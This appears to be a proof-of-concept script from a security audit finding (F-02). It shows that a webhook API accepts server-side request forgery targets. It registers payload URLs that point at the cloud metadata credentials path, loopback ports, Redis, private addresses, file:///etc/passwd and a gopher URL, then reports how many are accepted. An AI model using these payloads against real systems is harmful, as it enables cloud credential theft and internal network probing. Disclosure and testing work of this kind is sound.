// F-02 — Webhook registration performs no URL scheme/host validation, creating
// a server-side request forgery (SSRF) sink.
//
// POST /api/v1/webhooks accepts arbitrary URLs as delivery targets, including
// the cloud metadata IP (169.254.169.254), loopback, RFC1918, and non-HTTP
// schemes (file://, gopher://, ftp://, javascript:). When a transfer event
// fires, the server issues a POST to these targets — enabling metadata/credential
// theft, internal port scanning, and gopher-based interaction with internal
// services (e.g. Redis). Registration acceptance is demonstrated here; delivery
// occurs server-side on real transfer events.
//
// Run:  MH_API_KEY=mh_test_... node 02-webhook-ssrf.mjs   (self-provisions if unset)
import { rest, provisionApiKey, section, line, verdict } from "./_lib.mjs";

const { key } = await provisionApiKey();
const u = () => "wh-" + Math.random().toString(36).slice(2) + Date.now();
const sleep = (ms) => new Promise((z) => setTimeout(z, ms));

// clean slate (endpoint cap is small)
async function clearWebhooks() {
  const l = await rest("/webhooks", { apiKey: key });
  for (const w of (l.body?.items || l.body?.data || [])) {
    await rest(`/webhooks/${w.id}`, { method: "DELETE", apiKey: key, idem: u(), body: {} });
    await sleep(120);
  }
}
await clearWebhooks();

const targets = [
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/", // cloud metadata
  "http://127.0.0.1:22",            // loopback / port scan
  "http://[::1]:6379/",             // IPv6 loopback (Redis)
  "http://10.0.0.1/internal",       // RFC1918
  "file:///etc/passwd",             // local file scheme
  "gopher://127.0.0.1:6379/_INFO",  // gopher -> arbitrary TCP
];

section("Register internal / dangerous webhook targets");
const created = [];
let accepted = 0;
for (const url of targets) {
  const r = await rest("/webhooks", { method: "POST", apiKey: key, idem: u(),
    body: { url, events: ["transfer.completed"] } });
  if (r.status === 200) { accepted++; created.push(r.body.id); }
  line(`[${r.status}] ${r.status === 200 ? "ACCEPTED" : "rejected"}  ${url}`);
  await clearWebhooks();            // free the slot for the next target
  await sleep(150);
}

section("VERDICT");
verdict(accepted >= 3, `${accepted}/${targets.length} internal/non-HTTP webhook targets accepted with no SSRF validation`);
process.exit(accepted >= 3 ? 0 : 1);
